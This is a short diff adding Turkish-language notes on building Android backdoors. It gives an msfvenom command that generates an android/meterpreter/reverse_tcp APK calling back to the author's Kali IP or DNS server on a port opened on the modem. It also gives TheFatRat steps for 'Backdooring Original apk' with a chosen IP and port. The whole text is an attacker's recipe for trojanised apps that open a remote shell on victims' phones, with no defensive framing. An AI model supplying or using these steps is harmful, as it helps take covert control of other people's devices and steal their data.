@@ -1,0 +1,10 @@
+
+Msfvenom Framework:
+    -> msfvenom -p <payload(android/meterpreter/reverse_tcp)> LHOST=<Kali_Ip/DNS_Sunucumuz> LPORT=<Modemde açtığımız port/port> -o <kayıt yolu ve adı.apk>
+
+
+TheFatrat Framework:
+    TheFatrat Framework'ünü kuruyoruz.
+    ->5 (Backdooring Original apk)
+    ->Ip ve prt belirliyoruz.
+    
